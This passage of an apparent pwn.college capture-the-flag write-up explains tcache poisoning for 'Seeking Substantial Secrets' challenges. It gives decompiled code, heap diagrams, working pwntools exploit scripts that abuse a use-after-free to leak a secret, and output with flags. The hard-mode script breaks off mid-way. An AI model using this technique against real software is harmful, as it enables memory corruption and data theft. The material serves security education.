[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 

[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 

[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 


[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit):
[*] Leaked Secret: ipubljho

[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Secret: 
Authorized!
You win! Here is your flag:
pwn.college{smCm7JHRquJbXskS-KlEMuZeUe5.0lM4MDL4ITM0EzW}
```

&nbsp;

## Seeking Substantial Secrets (Easy)

```
hacker@dynamic-allocator-misuse~seeking-substantial-secrets-easy:/$ /challenge/seeking-substantial-secrets-easy 
###
### Welcome to /challenge/seeking-substantial-secrets-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

In this challenge, there is a secret stored at 0x429964.
If you can leak out this secret, you can redeem it for the flag.


[*] Function (malloc/free/puts/scanf/send_flag/quit): 
```

### Binary Analysis

```c title="/challenge/seeking-substantial-secrets-easy :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  unsigned int v4; // eax
  int i; // [rsp+2Ch] [rbp-124h]
  unsigned int v7; // [rsp+30h] [rbp-120h]
  unsigned int v8; // [rsp+30h] [rbp-120h]
  unsigned int v9; // [rsp+30h] [rbp-120h]
  unsigned int v10; // [rsp+30h] [rbp-120h]
  unsigned int size; // [rsp+34h] [rbp-11Ch]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v14; // [rsp+148h] [rbp-8h]

  v14 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  for ( i = 0; i <= 15; ++i )
    byte_429964[i] = rand() % 26 + 97;
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 16LL);
  printf("In this challenge, there is a secret stored at %p.\n", byte_429964);
  puts("If you can leak out this secret, you can redeem it for the flag.\n");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            print_TCACHE(main_thread_TCACHE);
            puts(byte_4035BA);
            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
            __isoc99_scanf("%127s", choice);
            puts(byte_4035BA);
            if ( strcmp(choice, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_4035BA);
            v7 = atoi(choice);
            if ( v7 > 0xF )
              __assert_fail("allocation_index < 16", "<stdin>", 0x117u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_4035BA);
            size = atoi(choice);
            printf("[*] allocations[%d] = malloc(%d)\n", v7, size);
            ptr[v7] = malloc(size);
            printf("[*] allocations[%d] = %p\n", v7, ptr[v7]);
          }
          if ( strcmp(choice, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_4035BA);
          v8 = atoi(choice);
          if ( v8 > 0xF )
            __assert_fail("allocation_index < 16", "<stdin>", 0x129u, "main");
          printf("[*] free(allocations[%d])\n", v8);
          free(ptr[v8]);
        }
        if ( strcmp(choice, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_4035BA);
        v9 = atoi(choice);
        if ( v9 > 0xF )
          __assert_fail("allocation_index < 16", "<stdin>", 0x136u, "main");
        printf("[*] puts(allocations[%d])\n", v9);
        printf("Data: ");
        puts((const char *)ptr[v9]);
      }
      if ( strcmp(choice, "scanf") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", choice);
      puts(byte_4035BA);
      v10 = atoi(choice);
      if ( v10 > 0xF )
        __assert_fail("allocation_index < 16", "<stdin>", 0x143u, "main");
      v3 = malloc_usable_size(ptr[v10]);
      sprintf(choice, "%%%us", v3);
      v4 = malloc_usable_size(ptr[v10]);
      printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v10);
      __isoc99_scanf(choice, ptr[v10]);
      puts(byte_4035BA);
    }
    if ( strcmp(choice, "send_flag") )
      break;
    printf("Secret: ");
    __isoc99_scanf("%127s", choice);
    puts(byte_4035BA);
    if ( !memcmp(choice, byte_429964, 16uLL) )
    {
      puts("Authorized!");
      win();
    }
    else
    {
      puts("Not authorized!");
    }
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

This time, we can see that the secret is 16 bytes long. Therefore, we will have to employ two rounds of Tcache `entry_struct` poisoning.

### Polluting Tcache `entry_struct` multiple times

Let's say we allocate two chunks `A`, `B` of memory and then free them. It would look something as follows:

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│    next: &B      │ ────╮
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry B  ┆
├──────────────────┤
│    next: NULL    │ 
├──────────────────┤
│    key: Void     │ 
└──────────────────┘
```

Then we use the `scanf` command and read to the index of the first allocation `A` using the hanging pointer. The first 8 bytes at that location would hold the `next` pointer which would point to `B`. 

We can overwrite this with the address of the secret.
This would cause the chunk `B` to be removed from the singly-linked list, and the memory at the secret address would take it's place.

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│  next: &SECRET   │ ────╮
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
                         │
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐     │
┆  TCACHE_entry B  ┆     │
├──────────────────┤     │
│    next: NULL    │     │
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆      SECRET       ┆
├───────────────────┤
│ next: secret[:8]  │ 
├───────────────────┤
│ key: secret[8:16] │ 
└───────────────────┘
```

Now, if we allocate two chunks again of the same size, the chunk `A` and `SECRET` would be allocated because to `TCACHE_perthread_struct`, those are the two free chunks. The first 8 bytes of the `SECRET` chunk would hold the first 8 bytes of secret value, and the next 8 bytes would be right after that.

However, due to Tcache's behaviour of setting the `key` pointer to `NULL` after allocating a chunk, the trailing 8 bytes of the secret value are clobbered.
So, by polluting `TCACHE_perthread_struct` once, we are able to get only the first 8 bytes.

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                               ┊
┊            ┏━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_128: 0          ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_128: secret[:8] ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│  ..............  │ 
├──────────────────┤  
│       NULL       │ 
└──────────────────┘  


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆      SECRET      ┆
├──────────────────┤
│    secret[:8]    │ 
├──────────────────┤
│       NULL       │ 
└──────────────────┘
```

For the next, 8 bytes, we have to pollute Tcache `entry_struct` again, but this time we set the address into which `scanf` reads to 8 bytes after the secret value's address. So, let's free the first allocation only so that it is added back into the singly linked list.

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 1    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│  next: &SECRET   │
├──────────────────┤     
│    key: Void     │     
└──────────────────┘     
```

Then we use the `scanf` command and read to the index of the first allocation `A` using the hanging pointer. 
We can overwrite this with the address of the `secret` plus 8.

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│  next: &SECRET2  │ ────╮
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆      SECRET2       ┆
├────────────────────┤
│ next: secret[8:16] │ 
├────────────────────┤
│      key: ....     │ 
└────────────────────┘
```

Now, if we allocate two chunks again of the same size, the chunk `A` and `SECRET2` would be allocated because to `TCACHE_perthread_struct`, those are the two free chunks. And the first 8 bytes of the `SECRET` chunk would hold the remaining secret value.

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                                 ┊
┊            ┏━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_128: 0            ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_128: secret[8:16] ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│  ..............  │ 
├──────────────────┤  
│       NULL       │ 
└──────────────────┘  


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆      SECRET2       ┆
├────────────────────┤
│    secret[8:16]    │ 
├────────────────────┤
│        NULL        │ 
└────────────────────┘
```

This time, even if after allocation the `key` pointer is set to `NULL` we don't care because we have the secret value's second half in the first 8 bytes itself.


### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/seeking-substantial-secrets-easy", level='error')

# 1. Capture the target address
p.recvuntil(b"secret stored at ")
addr_hex = p.recvuntil(b".").strip(b".").decode()
secret_addr = int(addr_hex, 16)
print(f"[*] Target Secret Address: {hex(secret_addr)}")

# --- LEAK PART 1 (First 8 Bytes) ---
p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"free")
p.sendline(b"1")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"free")
p.sendline(b"0")
print(p.recvuntil(b"quit): ").decode())

# Poison Index 0 to point to the first half of the secret value
p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(secret_addr))
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"puts")
p.sendline(b"1")
# Use ljust to ensure we have 8 bytes even if puts hits a null early
p.recvuntil(b"Data: ")
part1 = p.recvline().strip().ljust(8, b"\x00")[:8]
print(f"Part 1: {part1}")
print(p.recvuntil(b"quit): ").decode())

# --- LEAK PART 2 (Second 8 Bytes) ---
# We free Index 0 (real heap) to reuse the bin. We DO NOT free Index 1 (secret chunk's first half).
p.sendline(b"free")
p.sendline(b"0")
print(p.recvuntil(b"quit): ").decode())

# Poison Index 0 to point to the second half of the secret value
p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(secret_addr + 8))
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"puts")
p.sendline(b"1")
p.recvuntil(b"Data: ")
part2 = p.recvline().strip().ljust(8, b"\x00")[:8]
print(f"Part 2: {part2}")
print(p.recvuntil(b"quit): ").decode())

# --- SUBMIT ---
full_secret = part1 + part2
p.sendline(b"send_flag")
p.sendline(full_secret)
print(p.recvuntil(b"}").decode())
```

```
hacker@dynamic-allocator-misuse~seeking-substantial-secrets-easy:/$ python ~/script.py
[*] Target Secret Address: 0x429964

If you can leak out this secret, you can redeem it for the flag.


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 
[*] allocations[0] = malloc(128)
[*] allocations[0] = 0x3c2cd2c0

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 
[*] allocations[1] = malloc(128)
[*] allocations[1] = 0x3c2cd350

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
[*] free(allocations[1])
+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x3c2cd350           | KEY: 0x3c2cd010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x3c2cd350          | 0                   | 0x91 (P)                     | (nil)               | 0x3c2cd010          |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 2     | HEAD: 0x3c2cd2c0           | KEY: 0x3c2cd010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x3c2cd2c0          | 0                   | 0x91 (P)                     | 0x3c2cd350          | 0x3c2cd010          |
| 0x3c2cd350          | 0                   | 0x91 (P)                     | (nil)               | 0x3c2cd010          |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
[*] scanf("%136s", allocations[0])

+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 2     | HEAD: 0x3c2cd2c0           | KEY: 0x3c2cd010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x3c2cd2c0          | 0                   | 0x91 (P)                     | 0x429964            | 0x3c2cd000          |
| 0x429964            | 0                   | 0 (NONE)                     | 0x65656f6c6b6a6461  | 0x7165656a7268696e  |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 
[*] allocations[0] = malloc(128)
[*] allocations[0] = 0x3c2cd2c0
+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x429964             | KEY: 0x3c2cd010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x429964            | 0                   | 0 (NONE)                     | 0x65656f6c6b6a6461  | 0x7165656a7268696e  |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Part 1: b'adjkloee'

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x3c2cd2c0           | KEY: 0x3c2cd010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x3c2cd2c0          | 0                   | 0x91 (P)                     | 0x65656f6c6b6a6461  | 0x3c2cd010          |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
[*] scanf("%136s", allocations[0])

+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x3c2cd2c0           | KEY: 0x3c2cd010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x3c2cd2c0          | 0                   | 0x91 (P)                     | 0x42996c            | 0x3c2cd000          |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 
[*] allocations[0] = malloc(128)
[*] allocations[0] = 0x3c2cd2c0

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 
[*] allocations[2] = malloc(128)
[*] allocations[2] = 0x3c2cd3e0

[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Part 2: b'\x00\x00\x00\x00\x00\x00\x00\x00'

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Secret: 
Authorized!
You win! Here is your flag:
pwn.college{8h25mcw-m2mhr_jLouARLydGJix.01M4MDL4ITM0EzW}
```

&nbsp;

## Seeking Substantial Secrets (Hard)

```
hacker@dynamic-allocator-misuse~seeking-substantial-secrets-hard:/$ /challenge/seeking-substantial-secrets-hard 
###
### Welcome to /challenge/seeking-substantial-secrets-hard!
###


[*] Function (malloc/free/puts/scanf/send_flag/quit): 
```

The solution is the same as the [easy one](#polluting-TCACHE-entry_struct-multiple-times), only difference being that we have to find the address of the secret value.

### Binary Analysis

```c title="/challenge/seeking-substantial-secrets-hard :: main() :: Pseudocode" showLineNumbers 
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int i; // [rsp+2Ch] [rbp-124h]
  unsigned int v6; // [rsp+30h] [rbp-120h]
  unsigned int v7; // [rsp+30h] [rbp-120h]
  unsigned int v8; // [rsp+30h] [rbp-120h]
  unsigned int v9; // [rsp+30h] [rbp-120h]
  unsigned int size; // [rsp+34h] [rbp-11Ch]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-8h]

  v13 = __readfsqword(40u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  for ( i = 0; i <= 15; ++i )
    byte_427051[i] = rand() % 26 + 97;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            puts(byte_40214C);
            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
            __isoc99_scanf("%127s", choice);
            puts(byte_40214C);
            if ( strcmp(choice, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_40214C);
            v6 = atoi(choice);
            if ( v6 > 15 )
              __assert_fail("allocation_index < 16", "<stdin>", 114u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_40214C);
            size = atoi(choice);
            ptr[v6] = malloc(size);
          }
          if ( strcmp(choice, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_40214C);
          v7 = atoi(choice);
          if ( v7 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 130u, "main");
          free(ptr[v7]);
        }
        if ( strcmp(choice, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_40214C);
        v8 = atoi(choice);
        if ( v8 > 15 )
          __assert_fail("allocation_index < 16", "<stdin>", 142u, "main");
        printf("Data: ");
        puts((const char *)ptr[v8]);
      }
      if ( strcmp(choice, "scanf") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", choice);
      puts(byte_40214C);
      v9 = atoi(choice);
      if ( v9 > 15 )
        __assert_fail("allocation_index < 16", "<stdin>", 154u, "main");
      v3 = malloc_usable_size(ptr[v9]);
      sprintf(choice, "%%%us", v3);
      __isoc99_scanf(choice, ptr[v9]);
      puts(byte_40214C);
    }
    if ( strcmp(choice, "send_flag") )
      break;
    printf("Secret: ");
    __isoc99_scanf("%127s", choice);
    puts(byte_40214C);
    if ( !memcmp(choice, byte_427051, 16uLL) )
    {
      puts("Authorized!");
      win();
    }
    else
    {
      puts("Not authorized!");
    }
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/seeking-substantial-secrets-hard", level='error')

secret_addr = 0x427051

# --- LEAK PART 1 (First 8 Bytes) ---
p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"free")
p.sendline(b"1")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"free")
p.sendline(b"0")
print(p.recvuntil(b"quit): ").decode())

# Poison Index 0 to point to the first half of the secret value
p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(secret_addr))
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"puts")
p.sendline(b"1")
# Use ljust to ensure we have 8 bytes even if puts hits a null early
p.recvuntil(b"Data: ")
part1 = p.recvline().strip().ljust(8, b"\x00")[:8]
print(f"Part 1: {part1}")
print(p.recvuntil(b"quit): ").decode())

# --- LEAK PART 2 (Second 8 Bytes) ---
# We free Index 0 (real heap) to reuse the bin. We DO NOT free Index 1 (secret chunk's first half).
p.sendline(b"free")
p.sendline(b"0")
print(p.recvuntil(b"quit): ").decode())

# Poison Index 0 to point to the second half of the secret value
p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(secret_addr + 8))
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"puts")
p.sendline(b"1")
